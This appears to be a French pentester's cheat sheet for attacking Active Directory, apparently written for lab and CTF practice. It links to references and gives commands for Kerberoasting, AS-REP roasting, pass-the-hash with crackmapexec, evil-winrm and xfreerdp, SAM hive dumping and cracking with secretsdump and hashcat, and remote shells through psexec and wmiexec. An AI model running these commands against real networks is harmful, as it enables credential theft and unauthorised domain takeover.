## Bases LDAP

https://www-sop.inria.fr/members/Laurent.Mirtain/ldap-livre.html

# Doc AD:

- https://zer1t0.gitlab.io/posts/attacking_ad/

- https://ntlm.info/

- https://tesserent.com/insights/blog/dumping-windows-credentials?utm_source=securusglobal.com&utm_medium=301

- https://beta.hackndo.com/pass-the-hash/#protocole-ntlm

- https://attl4s.github.io/assets/pdf/You_do_(not)_Understand_Kerberos.pdf

- https://academy.hackthebox.com/course/preview/active-directory-bloodhound

`mindmap`https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2023_02.svg

`potato local privesc -> voir ../windows`

## Cheatsheet 

[thehacker.recipes](https://www.thehacker.recipes/)
[ad cheatsheet - tools](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)

## Réseau

https://stackoverflow.com/questions/12260587/kerberos-fails-when-accessing-site-by-ip-address

```
/etc/hosts
ip DOMAIN
ip DC
```

## Kerberoasting / ASRepRoasting & Enumeration

### Kerberoast

**SPN non vide**

- https://beta.hackndo.com/kerberoasting/
- [GetUserSPNs.py](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py)

```
Un utilisateur authentifié sur un domaine AD peut demander un TGT (Ticket Granting Ticket) au KDC, (Key Distribution Center) via une requête KRB_AS_REQ, le KDC lui enverra alors un TGT au nom de l’utilisateur demandeur et une clé de session chiffré avec le hash NT de l’utilisateur, via une réponse KRB_AS_REP.
Ensuite, l’utilisateur peut faire une demande de ST (Service Ticket) au TGS (Ticket Granting Service) en fournissant son TGT et un SPN (Service Principal Name) valide, via une requête KRB_TGS_REQ, le KDC lui enverra alors un ST pour le service demandé via une réponse KRB_TGS_REP.

Ce ST est chiffré avec le hash NT du compte de service demandé. On dit alors que ce compte est Kerberoastable. Un attaquant peut tenter de retrouver le password du compte de service via du bruteforce en offline.
```

### AsRepRoast

**User sans PreAuth**

- https://beta.hackndo.com/kerberos-asrep-roasting/
- https://www.login-securite.com/2022/11/03/analyse-et-poc-de-la-cve-2022-33679/
- ([UAC values](https://jackstromberg.com/2013/01/useraccountcontrol-attributeflag-values/))
- [GetNPUsers.py](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py)

```
On parle d’utilisateur AS_REP Roastable lorsque la pré-authentification Kerberos n’est pas requise pour cette utilisateur. Nous pouvons alors demander un TGT (Ticket Granting Ticket) au KDC (Key Distribution Center) à son nom et cracker une partie de la réponse KRB_AS_REP, qui contient le TGT et une clé de session chiffré avec son hash NT. 
Un attaquant peut tenter de retrouver le password de ce compte de domaine via du bruteforce en offline.
```

[Box Active (HTB)](https://0xdf.gitlab.io/2018/12/08/htb-active.html)

Synchroniser l'horloge:

`sudo ntpdate <ip>`

- `crackmapexec`:
	- check GPPPassword ([share spidering](https://www.infosecmatter.com/crackmapexec-module-library/?cmem=smb-spider_plus): spider_plus): `cme smb <Domain> -u <user> -p <pass> -M gpp_password`
	- check SamAccountName: `crackmapexec smb <ip> -M nopac` & `crackmapexec ldap -d <Domain> -u <user> -p <pass> -M Maq` (max machines à créer)
	- Pass The Hash: `crackmapexec <ip> -u Administrator -H <lmhash:nthash> -x 'whoami'`

## Silver/Golden Ticket

- https://beta.hackndo.com/kerberos-silver-golden-tickets/#pac
- https://github.com/fortra/impacket/issues/1457

## Shell

**Domain.local/Administrator@127.0.0.1**

`psexec.py <Domain>/<user>:<pass>@<DC.local>`
`wmiexec.py <Domain>/<user>@<DC.local> -hashes ':<nthash>'`

## FreeRDP2

(TryHackMe AD Basics)

```bash
xfreerdp /v:10.10.222.63 /u:THM\Mark /p:M4rk3t1ng.21
```

![](./thm_rdp.png)

## Memo

- http://attack.mitre.org/techniques/T1003/002/
- https://youtu.be/L26Xq7m0uQ0

### Victim AD

```powershell
#administrator
reg save HKLM\sam ./sam.save
reg save HKLM\system ./system.save
```

### Offline

```bash
#hashes.txt
impacket-secretsdump -sam sam.save -system system.save LOCAL
```

```bash
# interactive mode - cracking wordlist based on victim info
cupp -i
```

```bash
hashcat -m 1000 hashes.txt wordlist.txt
```

### Shell

```bash
#win-rm protocol
evil-winrm -i <ip> -u <account> -p <password>

#pass the hash
evil-winrm -i <ip> -u <account> -H <hash>
```

```bash
#remote desktop protocol
xfreerdp /v:<ip> /u:<account> /p:<password>

#pass the hash
xfreerdp /v:<ip> /u:<account> /pth:<hash>
```

## Lab AD

https://github.com/WazeHell/vulnerable-AD
https://github.com/Orange-Cyberdefense/GOAD
